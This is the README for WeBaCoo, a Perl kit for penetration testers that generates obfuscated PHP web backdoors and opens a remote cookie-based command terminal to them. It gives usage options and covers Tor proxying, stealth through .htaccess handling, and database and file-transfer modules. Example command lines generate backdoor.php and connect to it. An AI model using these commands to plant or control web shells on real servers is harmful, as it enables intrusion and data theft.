@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 _    _     ______       _____             
| |  | |    | ___ \     /  __ \            
| |  | | ___| |_/ / __ _| /  \/ ___   ___  
| |/\| |/ _ \ ___ \/ _` | |    / _ \ / _ \ 
\  /\  /  __/ |_/ / (_| | \__/\ (_) | (_) |
 \/  \/ \___\____/ \__,_|\____/\___/ \___/ 
                                           
     Web Backdoor Cookie Script-Kit
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Written by: Anestis Bechtsoudis @ bechtsoudis.com
Copyright (C) 2011-2012 Anestis Bechtsoudis


Disclaimer
==========
The tool is only for testing purposes and can only be used where strict consent has been given. Do not use it for illegal purposes.

License
=======
Any modifications, changes, or alterations to this application is acceptable, however, any public releases utilizing this code must be approved by its creator. Check the LICENSE file for more information.

Requirements
============
* perl installed
* liburi-perl
* libio-socket-socks-perl

If you do not want to install "libio-socket-socks-perl" for Tor proxy feature, comment line 25 at webacoo.pl

Usage
=====
webacoo.pl [options]

Options:
  -g		Generate backdoor code (-o is required)

  -f FUNCTION	PHP System function to use
	FUNCTION
		1: system 	(default)
		2: shell_exec
		3: exec
		4: passthru
		5: popen

  -o OUTPUT	Generated backdoor output filename

  -r 		Return un-obfuscated backdoor code

  -t		Establish remote "terminal" connection (-u is required)

  -u URL	Backdoor URL

  -e CMD	Single command execution mode (-t and -u are required)

  -m METHOD	HTTP method to be used (default is "GET")

  -c C_NAME	Cookie name (default: "M-cookie")

  -d DELIM	Delimiter (default: New random for each request)

  -a AGENT	HTTP header user-agent (default exist)

  -p PROXY	Use proxy (tor, ip:port or user:pass:ip:port)

  -v LEVEL	Verbose level
	LEVEL
		0: no additional info (default)
		1: print HTTP headers
		2: print HTTP headers + data

  -l LOG	Log activity to file

  -h		Display help and exit

  update	Check for updates and apply if any


Extension Modules
=================

Since 0.2.1 version an extension module support has been added in order
to provide extra functionalities to WeBaCoo. Within terminal mode you
can execute 'load' to list the available modules and initialize the desired
one from the list. By typing 'unload' you can restore back to the initial
terminal mode.

Available extension modules:
o mysql-cli	MySQL command line module
o psql-cli	Postgres command line module
o upload	File upload module using HTTP Post
o download	File download module using stdout print via 'od' & 'xxd'
o stealth	Increase stealth module via .htaccess handling


Examples
========

1. Create 'backdoor.php' obfuscated backdoor with default settings
./webacoo.pl -g -o backdoor.php

2. Create 'raw-backdoor.php' un-obfuscated backdoor using 'passthru' function
./webacoo.pl -g -o raw-backdoor.php -f 4 -r

3. Establish "terminal" connection with remote host using the default setup
./webacoo.pl -t -u http://127.0.0.1/backdoor.php

4. Establish "terminal" connection with remote host while setting some args
./webacoo.pl -t -u http://127.0.0.1/backdoor.php -c "Test-Cookie" -d "TtT"

5. Establish "terminal" connection with remote host through local http proxy
./webacoo.pl -t -u http://10.0.1.13/backdoor.php -p 127.0.0.1:8080

6. Establish "terminal" connection with remote host through http proxy with basic auth
./webacoo.pl -t -u http://10.0.1.13/backdoor.php -p user:password:10.0.1.8:3128

7. Establish "terminal" connection with remote host over Tor and log activity
./webacoo.pl -t -u http://example.com/backdoor.php -p tor -l webacoo_log.txt